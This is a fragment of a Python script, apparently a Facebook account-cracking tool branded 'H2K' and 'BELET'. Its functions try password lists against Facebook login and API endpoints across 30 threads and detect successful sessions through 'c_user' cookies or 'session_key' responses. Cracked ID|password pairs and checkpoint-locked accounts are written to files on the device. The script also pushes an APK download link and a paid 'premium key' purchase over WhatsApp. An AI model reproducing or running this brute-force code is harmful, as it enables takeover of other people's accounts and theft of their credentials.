...
----------------------------------------------
 ...
 Facebook   : Md Hasib
 Tool Name  : H2K
 Team name  : H2K ON FIRE 
 Version    : 3.0
----------------------------------------------
 H2K ON FIRE  3.0
 
 H2K JUST WAS NOT A NAME BRO ITS BRAND 
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[38;5;46m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/BELET_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi BELET Sir, I Need To Buy Your Paid BELET PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python BELET.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as BELET:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                BELET.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [BELET-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        BELET=session.cookies.get_dict().keys()
                        if "c_user" in BELET:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [BELET-OK] %s | %s'%(ids,pas))
                                open('/sdcard/BELET-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in BELET:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [BELET-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BELET-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [BELET-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BELET-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/BELET-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [BELET-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/BELET-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [BELET-OK] '+uid+' | '+pas+'\033[1;97m')
